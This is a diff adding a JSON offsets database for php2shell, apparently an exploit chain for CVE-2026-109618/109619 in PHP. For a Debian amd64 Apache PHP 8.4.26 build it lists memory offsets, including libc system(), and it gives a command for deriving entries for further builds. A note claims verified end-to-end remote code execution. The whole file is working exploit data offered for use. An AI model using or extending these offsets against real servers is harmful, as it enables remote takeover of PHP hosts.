@@ -1,0 +1,17 @@
+{
+  "_comment": "Offsets database for php2shell (CVE-2026-109618/109619). Each entry maps a fingerprint (distro + arch + SAPI + exact PHP version) to the build-specific constants the full chain needs. Append entries with: python3 derive_offsets.py <libphp.so> --append-db --distro <d> --arch <a> --sapi <s> --php-version <v> --dtor <0x...>",
+  "builds": [
+    {
+      "id": "debian-amd64-apache-8.4.26",
+      "distro": "debian",
+      "arch": "amd64",
+      "sapi": "apache",
+      "php_version": "8.4.26",
+      "zif_offset": "0x465370",
+      "dtor_offset": "0x65eb60",
+      "libc_system_offset": "0x53090",
+      "libc": "glibc-2.41",
+      "note": "Official php:8.4.26-apache image (Debian 13). Verified end-to-end RCE in this repo's lab."
+    }
+  ]
+}
